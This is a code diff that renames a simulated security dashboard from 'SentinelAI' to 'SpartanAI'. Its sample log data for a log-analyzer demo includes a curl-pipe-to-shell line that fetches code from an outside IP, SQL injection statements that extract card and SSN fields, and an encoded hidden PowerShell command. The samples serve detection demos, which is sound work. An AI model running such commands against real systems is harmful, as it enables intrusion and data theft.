@@ -106,7 +106,7 @@ const INITIAL_DEFENSES_DATA: SecurityDefense[] = [
   {
     id: "dns-sinkhole",
     name: "Dynamic DNS Sinkholing",
-    description: "Intercepts lookups for known malicious C2 command domains and sinkholes them dynamically into the SentinelAI secure loopback proxy.",
+    description: "Intercepts lookups for known malicious C2 command domains and sinkholes them dynamically into the SpartanAI secure loopback proxy.",
     category: "Network",
     status: "Standby",
     metrics: "Filtering 14,082 signatures",
@@ -195,7 +195,7 @@ const INITIAL_DEFENSES_DATA: SecurityDefense[] = [
   }
 ];
 
-// SentinelAI Hub Master (Offensive vs Defensive Cybersecurity Arena Datasets)
+// SpartanAI Hub Master (Offensive vs Defensive Cybersecurity Arena Datasets)
 interface HubOffense {
   id: string;
   name: string;
@@ -483,8 +483,8 @@ const INITIAL_THREAT_DATABASES: ThreatDatabase[] = [
   },
   {
     id: "sentinel-neural",
-    name: "SentinelAI Deep Neural Vector Index",
-    provider: "SentinelAI Cloud Hub Master",
+    name: "SpartanAI Deep Neural Vector Index",
+    provider: "SpartanAI Cloud Hub Master",
     signaturesCount: 3105501,
     lastUpdated: "Just Now",
     autoUpdateIntervalSec: 3,
@@ -745,7 +745,7 @@ const SAMPLE_LOGS = [
 May 26 04:12:46 acme-web-gateway sshd[44081]: debug1: Intercepted system payload via dl_open hook
 May 26 04:12:47 acme-web-gateway systemd[1]: Starting backup tasks... (triggered by root script)
 May 26 04:12:48 acme-web-gateway Process[44829]: /usr/bin/bash -c "curl -s http://198.51.100.42:8443/auth_key | sh"
-May 26 04:12:50 acme-web-gateway SentinelAI[ML_ANOMALY]: ALERT Outbound packet entropy (8.95) exceeding acceptable standard threshold for SSH session.`
+May 26 04:12:50 acme-web-gateway SpartanAI[ML_ANOMALY]: ALERT Outbound packet entropy (8.95) exceeding acceptable standard threshold for SSH session.`
   },
   {
     title: "Outbound SQL Injection & Data Theft",
@@ -753,7 +753,7 @@ May 26 04:12:50 acme-web-gateway SentinelAI[ML_ANOMALY]: ALERT Outbound packet e
     label: "Advanced SQL anomaly payload",
     log: `May 26 03:22:15 acme-prod-db-01 postgresql[19842]: [3-1] LOG:  statement: SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
 May 26 03:22:16 acme-prod-db-01 postgresql[19842]: [3-2] LOG:  statement: UNION SELECT null, null, credit_card_hash, ssn_token FROM compliance_vault LIMIT 100
-May 26 03:22:17 acme-prod-db-01 SentinelAI[ML_DB]: Threat rating 95. Rapid record extraction rate from non-authorized helpdesk IP address 10.80.32.180.`
+May 26 03:22:17 acme-prod-db-01 SpartanAI[ML_DB]: Threat rating 95. Rapid record extraction rate from non-authorized helpdesk IP address 10.80.32.180.`
   },
   {
     title: "Windows WinRAR RCE Exploit",
@@ -761,14 +761,14 @@ May 26 03:22:17 acme-prod-db-01 SentinelAI[ML_DB]: Threat rating 95. Rapid recor
     label: "PowerShell process spawn anomalies",
     log: `May 26 04:15:02 acme-win-desktop-104 WinRAR[32014]: Opened file archive invoice_summary_2026.zip
 May 26 04:15:03 acme-win-desktop-104 cmd[32015]: Child process spawned: "C:\\Windows\\System32\\cmd.exe" /c powershell -nop -w hidden -encodedcommand cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgAGkAdwByACAAaAB0AHQAcAA6AC8ALwAxADkA...
-May 26 04:15:04 acme-win-desktop-104 SentinelAI[Agent]: Threat Detected: Exploit behavior targeting CVE-2023-38831. Network execution payload isolated.`
+May 26 04:15:04 acme-win-desktop-104 SpartanAI[Agent]: Threat Detected: Exploit behavior targeting CVE-2023-38831. Network execution payload isolated.`
   }
 ];
 
 const getOffenseDatabaseName = (offenseId: string): string => {
   switch (offenseId) {
     case "ticket-extraction": return "Microsoft Security Intelligence Catalogue";
-    case "lsass-injection": return "SentinelAI Deep Neural Vector Index";
+    case "lsass-injection": return "SpartanAI Deep Neural Vector Index";
     case "zerologon": return "Kaspersky Threat Intelligence Hub";
     case "dll-hijack": return "ClamAV Core Signature Database";
     case "doh-exfil": return "Emerging Threats (ET) Snort Ruleset";
@@ -777,7 +777,7 @@ const getOffenseDatabaseName = (offenseId: string): string => {
     case "dirty-gdi": return "AlienVault Open Threat Exchange (OTX) API";
     case "blind-sql": return "VirusTotal Malicious Artifact Catalog";
     case "ssrf-cloud": return "Mitre ATT&CK Tactical Behaviors Directory";
-    default: return "SentinelAI Deep Neural Vector Index";
+    default: return "SpartanAI Deep Neural Vector Index";
   }
 };
 
@@ -813,8 +813,8 @@ export default function Home() {
   const [msiRegWatchEnabled, setMsiRegWatchEnabled] = useState<boolean>(true);
   const [msiMemScannerEnabled, setMsiMemScannerEnabled] = useState<boolean>(false);
   const [msiCompressionMode, setMsiCompressionMode] = useState<"LZMA" | "LZX" | "None">("LZMA");
-  const [msiServiceName, setMsiServiceName] = useState<string>("SentinelAVShield");
-  const [msiInstallPath, setMsiInstallPath] = useState<string>("C:\\Program Files\\Sentinel\\Antivirus");
+  const [msiServiceName, setMsiServiceName] = useState<string>("SpartanAVShield");
+  const [msiInstallPath, setMsiInstallPath] = useState<string>("C:\\Program Files\\Spartan\\Antivirus");
   const [msiSilentMode, setMsiSilentMode] = useState<boolean>(true);
   
   // Compilation Execution Engine states
@@ -855,7 +855,7 @@ export default function Home() {
 
   // Audit Trails Ledger
   const [auditLedger, setAuditLedger] = useState<AuditLog[]>([
-    { id: "lg-1", timestamp: "12:00:15 UTC", role: "SecOps Admin", tenant: "Acme Production Corp", action: "COCKPIT_INIT", details: "SentinelAI Endpoint Protection initialized globally.", status: "Success" },
+    { id: "lg-1", timestamp: "12:00:15 UTC", role: "SecOps Admin", tenant: "Acme Production Corp", action: "COCKPIT_INIT", details: "SpartanAI Endpoint Protection initialized globally.", status: "Success" },
     { id: "lg-2", timestamp: "12:05:40 UTC", role: "SecOps Admin", tenant: "Acme Production Corp", action: "SIEM_CONNECT", details: "Connected external SIEM ingestion pipeline utilizing tls-1.3 handshake.", status: "Success" }
   ]);
 
@@ -882,7 +882,7 @@ export default function Home() {
   const [autoUpdateEnabled, setAutoUpdateEnabled] = useState<boolean>(true);
   const [activeSyncingDbId, setActiveSyncingDbId] = useState<string | null>(null);
   const [adaptiveIntelligenceLogs, setAdaptiveIntelligenceLogs] = useState<string[]>([
-    "[CORE] SentinelAI Autonomous System active.",
+    "[CORE] SpartanAI Autonomous System active.",
     "[DB-SYNC] Checking signature hashes against Cisco, MITRE and Palo Alto Cloud endpoints...",
     "[DB-SYNC] All 10 threat intelligence catalogs synced down successfully."
   ]);
@@ -1325,7 +1325,7 @@ export default function Home() {
       }
     } catch (err: any) {
       console.error(err);
-      setAnalyzerResponse(`### **Network Failure**\n\nUnable to reach SentinelAI cloud cluster. Details: ${err?.message || "Internal Host error"}`);
+      setAnalyzerResponse(`### **Network Failure**\n\nUnable to reach SpartanAI cloud cluster. Details: ${err?.message || "Internal Host error"}`);
     } finally {
       setAnalyzingLog(false);
     }
@@ -1499,7 +1499,7 @@ export default function Home() {
         const newSiemLog: SiemFeed = {
           id: `siem-def-${Date.now()}`,
           timestamp: timeStr,
-          source: "SentinelAI-Control",
+          source: "SpartanAI-Control",
           event: `Countermeasure ${def.name}: Status changed to ${nextStatus.toUpperCase()}. System policies reconfigured.`,
           severity: nextStatus === "Active" ? "High" : "Low",
           type: "SYSTEM_PATCH"
@@ -1528,10 +1528,10 @@ export default function Home() {
     setAvCompiledArtifact(null);
     setAvCompileLogs([]);
     
-    const serviceNameClean = msiServiceName.replace(/[^a-zA-Z0-9]/g, "") || "SentinelAV";
+    const serviceNameClean = msiServiceName.replace(/[^a-zA-Z0-9]/g, "") || "SpartanAV";
     
     const initialLogs = [
-      `[COMPILER] Initializing SentinelAV Build Engine...`,
+      `[COMPILER] Initializing SpartanAV Build Engine...`,
       `[COMPILER] Target platform: Windows 10/11 x86_64`,
       `[COMPILER] Configuration payload loaded. Package ID: {4DE90FE1-7FBC-48B1-B597-B3B8A88102BA}`
     ];
@@ -1618,7 +1618,7 @@ export default function Home() {
       const newSiemLog: SiemFeed = {
         id: `siem-msi-${Date.now()}`,
         timestamp: timeStr,
-        source: "SentinelAI-Compiler",
+        source: "SpartanAI-Compiler",
         event: `MSI Compilation Complete: Generated ${fileName} (${sizeMb}) with minimal footprint. Ready for standalone deploy.`,
         severity: "Low",
         type: "SYSTEM_PATCH"
@@ -1647,7 +1647,7 @@ export default function Home() {
     
     setHubTerminalLogs([
       `[ARENA-EXPLOIT-ENGINE] Initializing offensive simulator sequence...`,
-      `[ARENA-EXPLOIT-ENGINE] Target: C:\\GitHub\\SentinelAI_Hub_Master\\SandboxCore`,
+      `[ARENA-EXPLOIT-ENGINE] Target: C:\\GitHub\\SpartanAI_Hub_Master\\SandboxCore`,
       `[ARENA-EXPLOIT-ENGINE] Loaded exploit model: ${selectedOffense.name} (${selectedOffense.cve})`,
       `[ARENA-EXPLOIT-ENGINE] Vulnerability Subsystem targeted: ${selectedOffense.subsystem}`,
       `[ARENA-EXPLOIT-ENGINE] Severity Class: ${selectedOffense.severity.toUpperCase()}`
@@ -1772,7 +1772,7 @@ export default function Home() {
         const newSiemLog: SiemFeed = {
           id: `siem-exploit-breach-${Date.now()}`,
           timestamp: timeStr,
-          source: "SentinelAI-Arena-Engine",
+          source: "SpartanAI-Arena-Engine",
           event: `UNSHIELDED BREACH INTERFERENCE: Exploit '${selectedOffense.name}' successfully executed against '${selectedOffense.subsystem}'. Host '${compromisedHostName || "Workstation"}' is now COMPROMISED!`,
           severity: "Critical",
           type: "ML_ANOMALY"
@@ -1816,7 +1816,7 @@ export default function Home() {
     setHubTerminalLogs([
       `[ARENA-SHIELD-ENGINE] Initializing local defensive countermeasure integration...`,
       `[ARENA-SHIELD-ENGINE] Selected Mechanism: ${defenseItem.name}`,
-      `[ARENA-SHIELD-ENGINE] Verification Standard: C:\\GitHub\\SentinelAI_Hub_Master\\Standards.md`,
+      `[ARENA-SHIELD-ENGINE] Verification Standard: C:\\GitHub\\SpartanAI_Hub_Master\\Standards.md`,
       `[ARENA-SHIELD-ENGINE] Running system audit command: ${defenseItem.command}`
     ]);
 
@@ -1855,7 +1855,7 @@ export default function Home() {
         `[ARENA-SHIELD-ENGINE] =============================================`,
         `[ARENA-SHIELD-ENGINE] DEFENSE POLICY RECONFIGURED`,
         `[ARENA-SHIELD-ENGINE] Countermeasure Status: ${nextStatusText}`,
-        `[ARENA-SHIELD-ENGINE] SentinelAI Hub Master Policy applied. system context strictly validated.`,
+        `[ARENA-SHIELD-ENGINE] SpartanAI Hub Master Policy applied. system context strictly validated.`,
         `[ARENA-SHIELD-ENGINE] =============================================`
       ]);
 
@@ -1966,7 +1966,7 @@ export default function Home() {
           </div>
           <div>
             <div className="flex items-center gap-2">
-              <h1 className="text-2xl font-semibold tracking-tight text-white font-sans">SentinelAI</h1>
+              <h1 className="text-2xl font-semibold tracking-tight text-white font-sans">SpartanAI</h1>
               <span className="text-xs bg-indigo-500/10 border border-indigo-500/30 text-indigo-400 font-mono py-0.5 px-2 rounded-full">
                 Security Suite (Simulated v4.1)
               </span>
@@ -2398,7 +2398,7 @@ export default function Home() {
                       Isolated Directory Nodes for <span className="text-indigo-300 font-mono font-medium text-xs bg-indigo-500/10 py-1 px-2.5 rounded border border-indigo-500/20">{tenantLabel(tenant)}</span>
                     </h2>
                     <p className="text-xs text-slate-400 mt-1">
-                      Showing isolated state of live machines reporting to SentinelAI endpoint agents.
+                      Showing isolated state of live machines reporting to SpartanAI endpoint agents.
                     </p>
                   </div>
                   <div className="text-[10px] bg-emerald-500/15 text-emerald-400 border border-emerald-500/30 font-mono py-1 px-2.5 rounded-full uppercase flex items-center gap-1.5">
@@ -2891,7 +2891,7 @@ export default function Home() {
                   <div>
                     <h2 className="text-base font-semibold text-white tracking-tight flex items-center gap-2">
                       <History className="w-4 h-4 text-indigo-400" />
-                      SentinelAI Forensic Cryptographic Audit Ledger
+                      SpartanAI Forensic Cryptographic Audit Ledger
                     </h2>
                     <p className="text-xs text-slate-400 mt-1">
                       Chronological immutable event ledger capturing security user state transitions, multi-tenant interactions, automated patching actions, and user authorization role checks.
@@ -3018,7 +3018,7 @@ export default function Home() {
                             <span className="text-[9.5px] font-mono py-0.5 px-1.5 rounded bg-indigo-500/10 text-indigo-400 border border-indigo-500/20">140 KB</span>
                           </div>
                           <p className="text-[10.5px] text-slate-400 mt-1.5 leading-relaxed">
-                            Bypasses heavy local data sets entirely. Performs sub-millisecond API telemetry queries to Sentinel Cloud Core.
+                            Bypasses heavy local data sets entirely. Performs sub-millisecond API telemetry queries to Spartan Cloud Core.
                           </p>
                         </button>
 
@@ -3166,7 +3166,7 @@ export default function Home() {
                             type="text"
                             value={msiServiceName}
                             onChange={(e) => setMsiServiceName(e.target.value)}
-                            placeholder="SentinelAVShield"
+                            placeholder="SpartanAVShield"
                             className="w-full bg-slate-950 border border-slate-800 rounded-xl py-2 px-3 text-xs text-slate-200 focus:outline-none focus:ring-1 focus:ring-indigo-500"
                             id="input-msi-service-name"
                           />
@@ -3178,7 +3178,7 @@ export default function Home() {
                             type="text"
                             value={msiInstallPath}
                             onChange={(e) => setMsiInstallPath(e.target.value)}
-                            placeholder="C:\Program Files\Sentinel\Antivirus"
+                            placeholder="C:\Program Files\Spartan\Antivirus"
                             className="w-full bg-slate-950 border border-slate-800 rounded-xl py-2 px-3 text-xs text-slate-200 focus:outline-none focus:ring-1 focus:ring-indigo-500"
                             id="input-msi-install-path"
                           />
@@ -3360,10 +3360,10 @@ export default function Home() {
                   <div>
                     <h2 className="text-base font-semibold text-white tracking-tight flex items-center gap-2">
                       <Sparkles className="w-4 h-4 text-yellow-400 animate-spin" style={{ animationDuration: "3s" }} />
-                      SentinelAI Hub Master: Cryptographic Offensive & Defensive Cyber Arena
+                      SpartanAI Hub Master: Cryptographic Offensive & Defensive Cyber Arena
                     </h2>
                     <p className="text-xs text-slate-400 mt-1">
-                      Simulate advanced threat execution models and deploy state-of-the-art military-grade cryptographic shield arrays matching the standards in <code className="text-indigo-400 font-mono">C:\GitHub\SentinelAI_Hub_Master</code>.
+                      Simulate advanced threat execution models and deploy state-of-the-art military-grade cryptographic shield arrays matching the standards in <code className="text-indigo-400 font-mono">C:\GitHub\SpartanAI_Hub_Master</code>.
                     </p>
                   </div>
                   <span className="text-[10px] font-mono bg-yellow-500/10 text-yellow-400 border border-yellow-500/30 py-1 px-2.5 rounded animate-pulse">
@@ -3932,7 +3932,7 @@ export default function Home() {
                   <div>
                     <h2 className="text-base font-semibold text-white tracking-tight flex items-center gap-2">
                       <ShieldCheck className="w-4 h-4 text-emerald-400 animate-pulse" />
-                      SentinelAI Advanced Threat Mitigation Arsenal (10x Controls)
+                      SpartanAI Advanced Threat Mitigation Arsenal (10x Controls)
                     </h2>
                     <p className="text-xs text-slate-400 mt-1">
                       Deploy instant network countermeasures and system level defenses directly within the air-gapped tenant sandbox.
@@ -4444,7 +4444,7 @@ export default function Home() {
 
       {/* Footer System Credits */}
       <footer className="mt-12 pt-6 border-t border-slate-900 text-center text-xs text-slate-500 font-mono" id="dashboard-footer">
-        <div>SentinelAI Cyber Security Cockpit — Fully AirGapped Cloud-Native Enterprise Node Manager</div>
+        <div>SpartanAI Cyber Security Cockpit — Fully AirGapped Cloud-Native Enterprise Node Manager</div>
         <div className="mt-1">Compiled and assessed against global regulation frameworks (SOC2 Type II, GDPR Safeguards, HIPAA, ISO 27001).</div>
       </footer>
     </div>
